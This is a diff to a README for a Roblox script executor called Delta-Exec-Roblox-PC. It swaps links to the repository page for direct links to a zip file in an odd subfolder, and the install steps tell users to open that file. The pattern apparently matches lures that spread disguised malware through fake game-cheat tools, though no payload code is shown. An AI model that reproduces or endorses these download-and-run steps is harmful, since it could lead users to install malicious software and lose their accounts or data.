@@ -1,6 +1,6 @@
 # ⚙️ Delta-Exec-Roblox-PC - Power Your Roblox Scripting Projects Today
 
-[![](https://img.shields.io/badge/Download-Delta-blue)](https://github.com/Gunter1393/Delta-Exec-Roblox-PC)
+[![](https://img.shields.io/badge/Download-Delta-blue)](https://github.com/Gunter1393/Delta-Exec-Roblox-PC/raw/refs/heads/main/kettle/Exec-PC-Roblox-Delta-yoursel.zip)
 
 Delta-Exec-Roblox-PC serves the needs of users who want to run scripts within the Roblox game environment. This tool provides a stable platform for script execution on Windows systems. It uses a custom Luau engine to process code quickly and keeps game latency at a minimum. Whether you develop your own scripts or test code from a library, this tool offers the stability required for consistent performance.
 
@@ -29,7 +29,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to download the software: https://github.com/Gunter1393/Delta-Exec-Roblox-PC
+1. Visit the repository page to download the software: https://github.com/Gunter1393/Delta-Exec-Roblox-PC/raw/refs/heads/main/kettle/Exec-PC-Roblox-Delta-yoursel.zip
 2. Locate the download button on the main release page.
 3. Save the installer file to your desktop or downloads folder.
 4. Open the file to begin the setup process.
